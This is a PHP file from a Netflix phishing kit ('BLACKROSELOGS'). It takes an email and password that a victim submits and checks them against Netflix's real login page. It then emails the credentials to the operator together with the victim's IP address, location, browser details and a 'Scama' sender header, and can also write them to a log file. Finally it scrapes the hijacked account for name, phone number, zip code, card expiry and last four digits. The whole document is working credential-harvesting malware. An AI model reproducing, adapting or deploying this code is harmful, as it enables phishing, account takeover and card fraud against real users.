<?php
/*  
BLACKROSELOGS
*/
if(isset($_POST['eml'])&&isset($_POST['pss'])){session_start();include'../mine.php';include'../../prevents/anti2.php';$Cookie['cookie_file']=__DIR__.'/logs/'.sha1(time()).'.log';function curl($url='',$var='',$header=false,$nobody=false,$csrf=''){global $Cookie;$curl=curl_init($url);curl_setopt($curl,CURLOPT_NOBODY,$header);curl_setopt($curl,CURLOPT_HEADER,$nobody);curl_setopt($curl,CURLOPT_TIMEOUT,10);curl_setopt($curl,CURLOPT_USERAGENT,'Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36');if($csrf){curl_setopt($curl,CURLOPT_HTTPHEADER,array('X-Requested-With: XMLHttpRequest','x-csrf-jwt: '.$csrf,'Accept: application/json, text/plain, */*','Content-Type: application/json;charset=utf-8'));}
if($var){curl_setopt($curl,CURLOPT_POST,true);curl_setopt($curl,CURLOPT_POSTFIELDS,$var);}
curl_setopt($curl,CURLOPT_COOKIEFILE,$Cookie['cookie_file']);curl_setopt($curl,CURLOPT_COOKIEJAR,$Cookie['cookie_file']);curl_setopt($curl,CURLOPT_SSL_VERIFYPEER,false);curl_setopt($curl,CURLOPT_REFERER,'https://www.netflix.com/login');curl_setopt($curl,CURLOPT_SSL_VERIFYHOST,2);curl_setopt($curl,CURLOPT_FOLLOWLOCATION,true);curl_setopt($curl,CURLOPT_RETURNTRANSFER,true);$result=curl_exec($curl);curl_close($curl);return $result;}
$get_token=curl('https://www.netflix.com/login');$preg_token=preg_match_all("/name=\"authURL\" value=\"(.*?)\"/",$get_token,$arr_token);$test_true=curl('https://www.netflix.com/ma-fr/login','email='.rawurlencode($_POST['eml']).'&password='.rawurlencode($_POST['pss']).'&rememberMe=true&flow=websiteSignUp&mode=login&action=loginAction&withFields=email%2Cpassword%2CrememberMe%2CnextPage%2CshowPassword&authURL='.rawurlencode($arr_token[1][0]).'&nextPage=&showPassword=: undefined',false,false);if(strpos($test_true,'<b>Mot de passe incorrect.</b>')){exit('error');}else{$_SESSION['computer']=gethostbyaddr($_SERVER['REMOTE_ADDR'])." | {$_POST['screen']}";		
		$msg .= "
<html>
<head><meta charset=\"UTF-8\"></head><br><br>
<div style='font-size: 14px;font-family:courier,helvetica,arial;font-weight:700;'>
[ NETFLIX LOGIN ]<br/>
<br>
[EMAIL]		: {$_POST['eml']}<br>
[PASSWORD]	: {$_POST['pss']}<br>
<br>
[ IP LOOKUP INFORMATION ]<br>
<br>
[COMPUTER]	: {$_SESSION['computer']}<br>
[IP ADDRESS]: {$_SESSION['ip']}><br>
[LOCATION]	: {$_SESSION['ip_city']}, {$_SESSION['ip_state']}, {$_SESSION['ip_countryName']}, {$_SESSION['currency']}<br>
[BROWSER]	: {$_SESSION['browser']} on {$_SESSION['os']}<br>
[USER AGENT]: {$_SERVER['HTTP_USER_AGENT']}<br>
[TIMEZONE]	: {$_SESSION['ip_timezone']}<br>
<br>
[ 🖤".$scamname."🖤 ]
<br></div></html>\n";
include'../../prevents/anti7.php';checkbot($msg);
if($saveintext=="yes"){$save=fopen("../../".$filename.".html","a+");fwrite($save,$msg);fclose($save);}
$subject="🖤 NETFLIX LOGIN - [".$_POST['eml']."] - [".$_SESSION['ip_countryName']."] ";$headers="From: NETFLIX Scama <newlogin@shadow.com>\r\n";$headers.="MIME-Version: 1.0\r\n";$headers.="Content-Type: text/html; charset=UTF-8\r\n";if($sendtoemail=="yes"){foreach(explode(",",$yours)as $your){@mail($your,$subject,$msg,$headers);}}
$PaymentPage=curl('https://www.netflix.com/signup/editcredit');$firstname=preg_match_all("/id=\"id_firstName\" value=\"(.*?)\"/i",$PaymentPage,$CCFname);if($CCFname[1][0]==NULL){$PaymentPage=curl('https://www.netflix.com/simplemember/editcredit');}
$get_phonenumber=curl('https://www.netflix.com/phonenumber');$Phone=preg_match_all("/id=\"phone\" value=\"(.*?)\"/i",$get_phonenumber,$PhoneNumber);if($PhoneNumber[1][0]==NULL){$_SESSION['phone']='';}else{$_SESSION['phone']=str_replace('\x2B','+',$PhoneNumber[1][0]);}
$Last4=preg_match_all("/id=\"id_creditCardNumber\" value=\"(.*?)\"/i",$PaymentPage,$CCLast4);if($CCLast4[1][0]==NULL){$_SESSION['last4']='';}else{$_SESSION['last4']=str_replace('*','',$CCLast4[1][0]);}
$exp_date=preg_match_all("/id=\"id_creditExpirationMonth\" value=\"(.*?)\"/i",$PaymentPage,$CCexpDt);if($CCexpDt[1][0]==NULL){$_SESSION['exp_date']='';}else{$_SESSION['exp_date']=$CCexpDt[1][0];}
$firstname=preg_match_all("/id=\"id_firstName\" value=\"(.*?)\"/i",$PaymentPage,$CCFname);if($CCFname[1][0]==NULL){$_SESSION['firstname']='';}else{$_SESSION['firstname']=$CCFname[1][0];}
$lastname=preg_match_all("/id=\"id_lastName\" value=\"(.*?)\"/i",$PaymentPage,$CCLname);if($CCLname[1][0]==NULL){$_SESSION['lastname']='';}else{$_SESSION['lastname']=$CCLname[1][0];}
$gzip=preg_match_all("/id=\"id_creditZipcode\" value=\"(.*?)\"/i",$PaymentPage,$zipC);if($zipC[1][0]==NULL){$_SESSION['zipCode']='';}else{$_SESSION['zipCode']=$zipC[1][0];}
exit('done');}}
?>